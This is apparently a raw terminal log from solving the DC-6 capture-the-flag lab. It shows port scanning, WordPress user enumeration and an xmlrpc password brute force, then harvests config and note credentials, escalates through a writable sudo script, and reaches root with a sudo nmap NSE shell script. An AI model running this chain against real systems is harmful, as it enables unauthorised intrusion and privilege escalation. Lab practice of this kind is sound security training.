@@ -1,0 +1,193 @@
+hack@kali:~$ nmap -A -p- 192.168.1.19
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-06 12:55 CEST                                    
+Nmap scan report for dc-6.homenet.telecomitalia.it (192.168.1.19)                                   
+Host is up (0.011s latency).                                                                        
+Not shown: 65533 closed ports                                                                       
+PORT   STATE SERVICE VERSION                                                                        
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)                                  
+| ssh-hostkey:                                                                                      
+|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)                                      
+|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)                                     
+|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)                                   
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to http://wordy/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds
+
+
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] jens
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] graham
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] mark
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] sarah
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+
+[+] Performing password attack on Xmlrpc against 5 user/s
+[SUCCESS] - mark / helpdesk01                                                                       
+Trying sarah / !lak019b Time: 00:08:31 <====================> (12547 / 12547) 100.00% Time: 00:08:31
+
+[i] Valid Combinations Found:
+ | Username: mark, Password: helpdesk01
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Mon Apr  6 13:57:03 2020
+[+] Requests Done: 12629
+[+] Cached Requests: 6
+[+] Data Sent: 5.889 MB
+[+] Data Received: 8.016 MB
+[+] Memory used: 237.773 MB
+[+] Elapsed time: 00:08:43
+
+
+
+define('WP_HOME','http://wordy');
+define('WP_SITEURL','http://wordy');
+
+define( 'DB_NAME', 'wordpressdb' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wpdbuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'meErKatZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+
+www-data@dc-6:/var/www/html$ cd /home
+cd /home
+www-data@dc-6:/home$ ls
+ls
+graham  jens  mark  sarah
+www-data@dc-6:/home$ cd mark
+cd mark
+www-data@dc-6:/home/mark$ ls
+ls
+stuff
+www-data@dc-6:/home/mark$ cd stuff
+cd stuff
+www-data@dc-6:/home/mark/stuff$ ls
+ls
+things-to-do.txt
+www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
+cat things-to-do.txt
+Things to do:
+
+- Restore full functionality for the hyperdrive (need to speak to Jens)
+- Buy present for Sarah's farewell party
+- Add new user: graham - GSo7isUM1D4 - done
+- Apply for the OSCP course
+- Buy new laptop for Sarah's replacement
+www-data@dc-6:/home/mark/stuff$ 
+
+www-data@dc-6:/home/mark/stuff$ su graham
+su graham
+Password: GSo7isUM1D4
+
+graham@dc-6:/home/mark/stuff$ 
+
+graham@dc-6:/home/mark/stuff$ id
+id
+uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
+graham@dc-6:/home/mark/stuff$ sudo -l
+sudo -l
+Matching Defaults entries for graham on dc-6:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User graham may run the following commands on dc-6:
+    (jens) NOPASSWD: /home/jens/backups.sh
+graham@dc-6:/home/mark/stuff$ cd /jens  
+cd /jens
+bash: cd: /jens: No such file or directory
+graham@dc-6:/home/mark/stuff$ cd /home/jens
+cd /home/jens
+graham@dc-6:/home/jens$ ls
+ls
+backups.sh
+graham@dc-6:/home/jens$ 
+
+graham@dc-6:/home/jens$ 
+
+graham@dc-6:/home/jens$ echo "/bin/bash" >> backups.sh
+echo "/bin/bash" >> backups.sh
+graham@dc-6:/home/jens$ 
+
+graham@dc-6:/home/jens$ cat backups.sh
+cat backups.sh
+#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+/bin/bash
+graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
+sudo -u jens ./backups.sh
+tar: Removing leading `/' from member names
+jens@dc-6:~$ id
+id
+uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
+jens@dc-6:~$ 
+
+jens@dc-6:~$ nmap --interactive
+nmap --interactive
+nmap: unrecognized option '--interactive'
+See the output of nmap -h for a summary of options.
+jens@dc-6:~$ 
+
+jens@dc-6:~$ echo "os.execute('/bin/sh')" > /tmp/shell.nse
+echo "os.execute('/bin/sh')" > /tmp/shell.nse
+jens@dc-6:~$ ls
+ls
+backups.sh  backups.tar.gz
+jens@dc-6:~$ sudo nmap --script=/tmp/shell.nse
+sudo nmap --script=/tmp/shell.nse
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-07 00:42 AEST
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+theflag.txt
+# cat theflag.txt
+
+
+Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
+   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+
+
